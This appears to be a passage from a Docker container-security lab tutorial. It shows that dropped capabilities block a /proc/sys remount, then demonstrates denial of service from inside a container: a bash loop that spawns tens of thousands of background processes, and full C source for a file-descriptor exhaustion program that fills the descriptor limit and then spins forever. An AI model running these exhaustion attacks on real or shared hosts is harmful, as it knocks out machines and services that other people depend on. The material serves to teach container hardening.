### Unprivileged containers

Try now to run an unprivilged container via the default `docker run` command:

```
docker run --rm -it ubuntu
```

Now try to re-use some of the techniques we have seen before to exploit privileged containers like:

```
mount -o rw,remount /proc/sys
```

you should get a `mount: permission denied`

why is that ?  
Yep we are running the container as root, but Docker drops a bunch of capabilities and therefore we cannot `remount`  
We also benefit from the cgroup and AppArmor protection.  

Good! We are safe!....aren't we ?  

Let's try this now:

```
exit
ulimit -a
```

Detect the max amount of process a user can have. (should be 64124)  
Open a new SSH shell and then: `ps -def | wc -l`  

```
docker run --rm -it ubuntu
for i in {1..32325}; do sleep infinity & done
```

Try now again on the other SSH shell with: `ps -def | wc -l`  

Yep we just DoS'd our machine.

Why did this happen ?  

Max User Processes: per user limit on the maximum number of processes. 


#### Max files

Max Files: per user limit on the maximum number of file descriptors that can be open.  
Copy this `C` snippet in a file called `file.c`, install the `build-essential` package from within the container and compile it via: `gcc file.c –o file`

```
/* file descriptor eater
** meant to be used in parallel ** @author jhertz */
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
int main(void) {
  int my_pid = getpid(); 
  char buf[128];
  int i = 0;
  for(i = 0; ; i++) {
    sprintf(buf, "/tmp/%d_%d", my_pid, i); int fd = open(buf, O_CREAT);
    if( -1 == fd) {
      printf("got to max fd# %d\n", i);
      break; 
    }
  }
  printf("stalling\n"); 
  for(;;);
}
```

After you built it with `gcc file.c –o file` run it via `./file`  

Let it run and then when you see the output `stalling` from a different shell try to touch a file via `touch test`  


#### Thoughts

Because we executed the container as root user we are allowed to install packages, which brought us to be able to build and execute a binary which fills up the FD.  
So NEVER run any container/process via `root` user!  

